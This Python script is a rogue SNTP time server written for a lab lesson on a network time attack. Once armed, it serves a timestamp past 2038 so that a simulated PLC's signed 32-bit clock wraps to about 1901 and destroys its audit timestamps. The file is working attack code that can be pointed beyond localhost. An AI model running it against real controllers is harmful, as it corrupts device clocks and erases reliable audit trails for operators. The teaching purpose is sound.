#!/usr/bin/env python3
# Rogue SNTP "time server" for the NTP adversary-in-the-middle + Year-2038 lesson.
#
# The StamPLC firmware's time client sends a 48-byte SNTP request; this answers it.
# While BENIGN it returns the real current time and the controller's clock is fine.
# Once ARMED (echo arm > /tmp/ntp_state) it returns a time safely past the signed
# 32-bit boundary (2038-01-19 03:14:07 UTC). The firmware stores the wall-clock in a
# signed int32 (CWE-197), so the value wraps negative and the controller's clock
# jumps to ~1901 - destroying its source-attributed audit timestamps. No exploit of
# the firmware is needed: the device trusts unauthenticated network time, so whoever
# answers the query owns the clock. That is the whole lesson.
#
# Serves on BOTH UDP and TCP on the same port (the firmware tries UDP first, then
# falls back to TCP - the contained QEMU twin's W5500 bridge carries TCP). Default
# port 1123 (unprivileged, so no root needed; real NTP is 123).
#
#   python3 ntp-aitm/ntp_server.py          # benign, 127.0.0.1:1123 (udp+tcp)
#   echo arm   > /tmp/ntp_state              # arm the time-step (another terminal)
#   echo benign > /tmp/ntp_state             # reset
import socket, struct, os, sys, time, threading

PORT  = int(os.environ.get("NTP_PORT", "1123"))
HOST  = os.environ.get("NTP_HOST", "127.0.0.1")   # 0.0.0.0 to serve on all interfaces (non-localhost attacker)
STATE = os.environ.get("NTP_STATE", "/tmp/ntp_state")
# Armed target: a time safely past 2038-01-19 03:14:07 UTC so the controller's
# signed-32-bit Unix field overflows. Default ~2038-06-01.
ARMED_UNIX = int(os.environ.get("NTP_ARMED_UNIX", "2159136000"))
NTP_DELTA  = 2208988800            # seconds between 1900-01-01 and 1970-01-01

def armed():
    try:
        return "arm" in open(STATE).read().lower()
    except OSError:
        return False

def sntp_response(unix_secs):
    pkt = bytearray(48)
    pkt[0] = 0x24                  # LI=0, VN=4, Mode=4 (server)
    pkt[1] = 2                     # stratum 2
    pkt[2] = 4                     # poll
    pkt[3] = 0xEC                  # precision
    # Transmit timestamp seconds-since-1900, 32-bit wire field (itself rolls at 2036
    # - part of the lesson). The client reads these 4 bytes (offset 40..43).
    secs1900 = (unix_secs + NTP_DELTA) & 0xFFFFFFFF
    struct.pack_into("!I", pkt, 40, secs1900)
    return bytes(pkt)

def answer(label):
    a = armed()
    unix = ARMED_UNIX if a else int(time.time())
    when = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(unix))
    sys.stderr.write(f"[NTP] {label} -> {'ARMED' if a else 'benign'}  (serving {when})\n")
    sys.stderr.flush()
    return sntp_response(unix)

def udp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    while True:
        try:
            _, addr = s.recvfrom(96)
            s.sendto(answer(f"udp query from {addr[0]}"), addr)
        except OSError:
            pass

def tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT)); s.listen(8)
    while True:
        try:
            c, addr = s.accept()
            try:
                c.settimeout(3); c.recv(96)
                c.sendall(answer(f"tcp query from {addr[0]}"))
            finally:
                c.close()
        except OSError:
            pass

if __name__ == "__main__":
    sys.stderr.write(f"[NTP] rogue time server on {HOST}:{PORT} (udp+tcp)  "
                     f"(arm with:  echo arm > {STATE})\n")
    threading.Thread(target=udp_server, daemon=True).start()
    tcp_server()
